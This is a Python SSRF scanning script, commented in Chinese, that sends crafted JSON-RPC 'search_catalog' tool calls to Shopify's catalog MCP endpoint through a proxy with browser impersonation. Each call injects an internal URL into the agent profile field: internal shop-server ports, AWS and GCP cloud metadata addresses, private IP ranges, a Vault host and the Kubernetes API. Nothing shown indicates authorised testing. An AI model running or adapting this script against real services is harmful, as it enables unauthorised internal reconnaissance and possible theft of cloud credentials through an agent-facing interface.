# -*- coding: utf-8 -*-
"""SSRF 端口扫描:shop-server 多端口 + metadata 变体 + GCP/AWS metadata 域名"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        print(f"[{label}] {dt:.1f}s | {r.text[:150]}", flush=True)
    except Exception as e:
        print(f"[{label}] ERROR {dt if False else ''}", flush=True)

if __name__ == "__main__":
    tests = [
        ("shopserver-443", "https://shop-server.sfe.shopifyinternal.com/healthz"),
        ("shopserver-4443", "https://shop-server.sfe.shopifyinternal.com:4443/healthz"),
        ("shopserver-8443", "https://shop-server.sfe.shopifyinternal.com:8443/healthz"),
        ("shopserver-9443", "https://shop-server.sfe.shopifyinternal.com:9443/healthz"),
        ("shopserver-8081", "https://shop-server.sfe.shopifyinternal.com:8081/healthz"),
        ("shopserver-8080", "https://shop-server.sfe.shopifyinternal.com:8080/healthz"),
        ("shopserver-4433", "https://shop-server.sfe.shopifyinternal.com:4433/healthz"),
        ("shopserver-6443", "https://shop-server.sfe.shopifyinternal.com:6443/healthz"),
        ("shopserver-6443-b", "https://shop-server.sfe.shopifyinternal.com:6443/"),
        # metadata 变体
        ("gcp-meta", "https://metadata.google.internal/computeMetadata/v1/"),
        ("meta-gcp", "https://metadata.google.internal/"),
        ("meta-169-https", "https://169.254.169.254/latest/meta-data/"),
        ("meta-169-8443", "https://169.254.169.254:8443/latest/meta-data/"),
        # 常见内网 IP 443
        ("10-0-0-1", "https://10.0.0.1/"),
        ("10-1-0-1", "https://10.1.0.1/"),
        ("172-16-0-1", "https://172.16.0.1/"),
        ("192-168-1-1", "https://192.168.1.1/"),
        ("shop.dev", "https://web-shop-client.shop.dev/"),
        ("shopifysvc", "https://foo.shopifysvc.com/"),
        ("internal-shop", "https://internal.shopify.com/"),
        ("vault", "https://vault.sfe.shopifyinternal.com/"),
        ("k8s-api", "https://kubernetes.default.svc.cluster.local/"),
    ]
    for label, p in tests:
        probe(label, p)
        time.sleep(0.4)
